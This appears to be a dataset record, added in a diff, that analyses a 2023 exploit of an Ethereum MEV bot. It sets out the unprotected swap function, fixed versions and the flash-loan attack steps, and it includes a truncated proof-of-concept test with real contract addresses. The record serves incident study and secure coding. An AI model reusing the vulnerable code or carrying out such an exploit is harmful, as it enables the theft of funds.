@@ -1,0 +1,42 @@
+{
+ "id": "2023__2023-11-07_MEVBot_AccessControl_ETH",
+ "source_file": "2023/2023-11-07_MEVBot_AccessControl_ETH.md",
+ "title": "MEV Bot — Analysis of Fund Theft via Access Control Vulnerability",
+ "date": "2023-11-07",
+ "protocol": "MEV Bot",
+ "chain": "Ethereum",
+ "loss_raw": "~$2,000,000 (approximately 1,047 WETH equivalent)",
+ "loss_usd": 2000000.0,
+ "root_cause": "Missing access control on public swap execution function (`0xf6ebebbb`) — unauthorized theft of tokens held by the bot",
+ "attack_tx": "0xbc08...a38",
+ "vulnerable_contract": "0x05f0...4a5",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code — zero access control\n// Anyone can call this function to swap the bot's entire balance to an arbitrary address\nfunction swap(\n    uint256 amount,         // Amount of tokens to swap (attacker sets to bot's full balance)\n    uint256 minOut,         // Minimum output amount (attacker sets to 0 — unlimited slippage)\n    address tokenIn,        // Input token address\n    address tokenOut,       // Output token address\n    address pool,           // Curve pool address (attacker-specified)\n    uint256 i,              // Curve exchange index i\n    uint256 j               // Curve exchange index j\n) external {\n    // ❌ No authorization check! Missing onlyOwner or onlyOperator modifier\n    IERC20(tokenIn).approve(pool, amount);\n    ICurve(pool).exchange(i, j, amount, minOut);\n    // Exchanged tokenOut remains in this contract (MEV bot)\n    // Attacker extracts accumulated tokenOut via a subsequent call to swap it again\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — owner authorization added\nmodifier onlyOwner() {\n    require(msg.sender == owner, \"Access denied: only owner can call\");\n    _;\n}\n\n// Or whitelist-based approach\nmodifier onlyAuthorized() {\n    require(authorizedOperators[msg.sender], \"Access denied: only authorized operators can call\");\n    _;\n}\n\nfunction swap(\n    uint256 amount,\n    uint256 minOut,\n    address tokenIn,\n    address tokenOut,\n    address pool,\n    uint256 i,\n    uint256 j\n) external onlyOwner {  // ✅ Access control modifier applied\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(minOut > 0, \"Slippage protection required\"); // ✅ Slippage protection added\n    IERC20(tokenIn).approve(pool, amount);\n    ICurve(pool).exchange(i, j, amount, minOut);\n}",
+  "// ✅ Immediate Action 1: Add onlyOwner modifier\ncontract MEVBot {\n    address public owner;\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Access denied: only owner can call\");\n        _;\n    }\n\n    // Apply modifier to vulnerable function\n    function swap(\n        uint256 amount,\n        uint256 minOut,\n        address tokenIn,\n        address tokenOut,\n        address pool,\n        uint256 i,\n        uint256 j\n    ) external onlyOwner {  // ✅ Access control added\n        require(minOut > 0, \"Slippage protection required\");        // ✅ Enforce minOut minimum\n        require(allowedPools[pool], \"Pool not whitelisted\");        // ✅ Pool address whitelist\n        require(amount <= IERC20(tokenIn).balanceOf(address(this)), \"Exceeds balance\");\n        IERC20(tokenIn).approve(pool, amount);\n        ICurve(pool).exchange(i, j, amount, minOut);\n    }\n}"
+ ],
+ "steps": [
+  "→ Borrow 27,255 WETH (delivered to attack contract)",
+  "[Step 2-A] MEV Bot Vulnerable Function Call #1: USDC → USDT",
+  "Result: Bot's 610,000 USDC → Curve 3Pool → Bot receives 609,647 USDT",
+  "[Step 2-B] MEV Bot Vulnerable Function Call #2: USDT (full) → WETH",
+  "Result: Bot's 1,194,647 USDT → Curve TriCrypto → Bot receives",
+  "[Step 2-C] MEV Bot Vulnerable Function Call #3: WBTC → WETH",
+  "Result: Bot's 10 WBTC → Curve TriCrypto → Bot receives 176.97 WETH",
+  "[Step 3] Attack Contract Direct Curve Swap: WETH → WBTC",
+  "1,339.83 WETH → 6.948 WBTC",
+  "[Step 4] MEV Bot Vulnerable Function Call #4: Bot's WETH → WBTC",
+  "Result: Bot's WETH → WBTC, received by attack contract",
+  "[Step 5] WBTC → WETH Reverse Swap (attack contract directly)",
+  "Net profit: ~1,047 WETH → transferred to attacker EOA (0x46d9...)"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────────────┐\n│  Attacker EOA (0x46d9...)                                               │\n│  Calls attack contract: attack()                                        │\n└───────────────────────────────┬─────────────────────────────────────────┘\n                                │\n                                ▼\n┌─────────────────────────────────────────────────────────────────────────┐\n│  [Step 1] Aave V3 Flash Loan                                            │\n│  aave.flashLoanSimple(attack_contract, WETH, 27,255 WETH, ...)          │\n│  → Borrow 27,255 WETH (delivered to attack contract)                   │\n└───────────────────────────────┬─────────────────────────────────────────┘\n                                │ Enter executeOp",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// @KeyInfo\n// Loss: ~$2M | Attack Tx: 0xbc08860c...\n// Vulnerable Contract: 0x05f016765c6C601fd05a10dBa1AbE21a04F924A5\n\ncontract ContractTest is Test {\n    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);\n    address router = 0x05f016765c6C601fd05a10dBa1AbE21a04F924A5; // ← Vulnerable MEV bot\n    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);\n    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n    ICurve firstCrvPool  = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7); // Curve 3Pool\n    ICurve secondCrvPool = ICurve"
+ ]
+}
